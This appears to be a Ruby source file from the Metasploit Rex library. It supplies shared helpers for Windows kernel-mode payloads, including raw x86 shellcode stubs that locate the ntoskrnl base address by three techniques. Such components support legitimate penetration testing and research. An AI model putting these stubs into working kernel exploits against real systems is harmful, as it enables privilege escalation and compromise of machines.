# -*- coding: binary -*-
module Rex
module Payloads
module Win32
module Kernel

require 'rex/payloads/win32/common'

#
# This class provides common methods that may be shared across more than
# one kernel-mode payload.  Many of these are from the following paper:
#
# http://www.uninformed.org/?v=3&a=4&t=sumry
#
module Common

  #
  # Returns a stub that will find the base address of ntoskrnl and
  # place it in eax.  This method works by using an IDT entry.  Credit
  # to eEye.
  #
  def self.find_nt_idt_eeye
    "\x8b\x35\x38\xf0\xdf\xff\xad\xad\x48\x81\x38\x4d\x5a\x90\x00\x75\xf7"
  end

  #
  # Returns a stub that will find the base address of ntoskrnl and
  # place it in eax.  This method uses a pointer found in KdVersionBlock.
  #
  def self.find_nt_kdversionblock
    "\x31\xc0\x64\x8b\x40\x34\x8b\x40\x10"
  end

  #
  # Returns a stub that will find the base address of ntoskrnl and
  # place it in eax.  This method uses a pointer found in the
  # processor control region as a starting point.
  #
  def self.find_nt_pcr
    "\xa1\x2c\xf1\xdf\xff\x66\x25\x01\xf0\x48\x66\x81\x38\x4d\x5a\x75\xf4"
  end

  #
  # Alias for resolving symbols.
  #
  def self.resolve_call_sym
    Rex::Payloads::Win32::Common.resolve_call_sym
  end

end

end
end
end
end
